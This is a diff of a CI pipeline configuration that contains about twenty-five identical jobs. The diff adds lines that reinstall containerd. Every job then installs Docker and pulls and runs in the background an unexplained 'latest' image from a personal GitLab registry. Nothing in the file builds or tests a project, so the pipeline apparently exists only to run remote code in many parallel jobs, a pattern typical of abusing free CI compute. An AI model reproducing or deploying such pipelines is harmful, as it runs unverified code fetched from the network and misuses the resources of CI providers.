@@ -19,6 +19,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -29,6 +31,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -39,6 +43,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -49,6 +55,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -59,6 +67,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -69,6 +79,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -79,6 +91,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -89,6 +103,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -99,6 +115,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -109,6 +127,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -119,6 +139,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -129,6 +151,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -139,6 +163,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -149,6 +175,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -159,6 +187,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -169,6 +199,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -179,6 +211,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -189,6 +223,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -199,6 +235,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -209,6 +247,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -219,6 +259,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -229,6 +271,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -239,6 +283,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -249,6 +295,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
@@ -259,6 +307,8 @@ jobs:
   steps:
   - script: |
       sudo apt update
+      sudo apt-get remove containerd -y
+      sudo apt-get install containerd.io -y
       sudo apt install docker.io -y
       sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
       sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
